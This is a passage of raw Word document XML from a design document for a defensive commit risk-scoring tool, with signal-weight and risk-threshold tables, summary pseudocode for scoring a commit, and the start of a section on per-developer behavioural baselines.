          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>High SAST finding</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>No cap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Per finding</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Medium/Low SAST finding</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+0.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>No cap</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Per finding</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Off-hours commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Once</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Author/committer mismatch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Once</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Unsigned commit</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+0.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Once</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Force push</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+2.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Once</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Large deletion (&gt;500 lines)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Once</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Suspicious message</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+0.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Once</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Sensitive file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>3.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Per file</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Binary file</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>2.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Per file</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Dependency tampering</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>-</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Once</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>CI/CD tampering</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>3.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Per instance</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Config weakening</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>+1.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>2.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Per instance</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Risk Level Thresholds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pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Risk Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Score Range</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Color</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Action Required</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>&gt;= 7.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Red</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Immediate security review required</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>&gt;= 4.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Orange</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Priority investigation recommended</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>&gt;= 2.0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Yellow</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Monitor and review when possible</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>&gt;= 0.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Blue</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Informational, low concern</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Clean</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>&lt; 0.5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Green</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2351"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>No action needed</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Code: Risk Score Calculation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="2D2D2D"/>
          <w:sz w:val="18"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        </w:rPr>
        <w:t>def analyze_commit(self, commit_data, diff_text, is_force_push=False):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    signals = []</w:t>
        <w:br/>
        <w:t xml:space="preserve">    score = 0.0</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 1. Metadata signals</w:t>
        <w:br/>
        <w:t xml:space="preserve">    meta_signals = self._check_metadata_signals(commit_data)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    signals.extend(meta_signals)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "off_hours" in meta_signals: score += 1.0</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "author_committer_mismatch" in meta_signals: score += 1.5</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if "unsigned_commit" in meta_signals: score += 0.5</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 2. Force push / Large deletion</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if is_force_push: score += 2.0</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if deletions &gt; 500: score += 1.0</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 3. SAST findings</w:t>
        <w:br/>
        <w:t xml:space="preserve">    findings = self._scan_diff(diff_text)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for f in findings:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        score += {critical: 2.5, high: 1.5, else: 0.5}</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    # 4. Sensitive files (1.5 each, cap 3.0)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 5. Suspicious message (+0.5)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 6. Binary files (1.0 each, cap 2.0)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 7. Dependency tampering (+1.5)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 8. CI/CD tampering (1.5 each, cap 3.0)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 9. Config weakening (1.0 each, cap 2.0)</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    score = min(round(score, 2), 10.0)  # Cap at 10</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return CommitAnalysisResult(risk_score, risk_level, signals, findings, sensitive_files)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>5. Stage 3 - Developer Behavioral Baselines</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>The BaselineEngine (services/baseline_engine.py, 362 lines) computes rolling behavioral baselines per developer from their commit history. These baselines establish what "normal" looks like for each developer, enabling statistical anomaly detection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 Baseline Metrics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left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Metric Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Metric</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:jc w:val="left"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>How Computed</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Timing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>mean_commit_hour</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Average UTC hour across recent commits</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Timing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>std_commit_hour</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Standard deviation of commit hours (floor: 1.0)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Timing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>typical_hour_start</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>mean - 1.5 * std, clamped to 0-23</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Timing</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>typical_hour_end</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>mean + 1.5 * std, clamped to 0-23</w:t>
